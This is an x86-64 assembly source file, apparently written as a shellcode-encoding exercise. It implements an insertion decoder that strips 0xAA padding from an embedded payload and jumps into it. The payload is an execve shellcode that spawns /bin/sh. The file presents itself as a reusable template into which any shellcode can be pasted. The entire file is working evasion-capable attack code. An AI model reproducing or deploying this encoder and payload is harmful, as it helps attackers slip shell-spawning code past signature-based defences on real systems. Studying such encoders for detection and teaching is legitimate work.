; Author : Abhinav Thakur
; Email  : compilepeace@gmail.com
;
; Description : This decoder removes the extra Bytes padding added into the shellcode and then
; 				executes it.
;
; NOTE : Just add the shellcode (comma separated values) after the label 'shellcode'
;
; SHELLCODE LENGTH = 112 bytes 



global _start


section .text
_start:
	
	jmp Main
	encoded_shellcode:	db	 0xeb,0xaa,0x10,0xaa,0x5f,0xaa,0x57,0xaa,0x48,0xaa,0x89,0xaa,0xe6,0xaa,0x48,0xaa,0x31,0xaa,0xc0,0xaa,0x50,0xaa,0x48,0xaa,0x89,0xaa,0xe2,0xaa,0xb0,0xaa,0x3b,0xaa,0x0f,0xaa,0x05,0xaa,0xe8,0xaa,0xeb,0xaa,0xff,0xaa,0xff,0xaa,0xff,0xaa,0x2f,0xaa,0x62,0xaa,0x69,0xaa,0x6e,0xaa,0x2f,0xaa,0x73,0xaa,0x68,0xaa, 0xbb,0xbb,0xbb,0xbb


Main:

	lea rdi, [rel encoded_shellcode]
	xor rsi, rsi
	mov	rcx, rsi
	add rsi, 0x1			; Points where actual shellcode bytes are to be placed
	xor rax, rax			
	add rax, 0x2			; Points to inserted bytes (0xAA's)
	
	mov	cl, 29				; Half the Length of encoded shellcode minus 1 (-1)
	
		
decode:
	
	mov	bl, byte [rdi + rax]
	;xor bl, 0xaa
	;jnz	short encoded_shellcode	
	mov	byte [rdi + rsi], bl 
	inc rsi
	add rax, 0x2
	loop decode

	mov	BYTE [rdi + 30], cl	; place a NULL byte at the end of the decoded shellcode
								; as the string '/bin/sh' should end with 0x00
	
	jmp	rdi					; Transfer control to the decoded shellcode
	

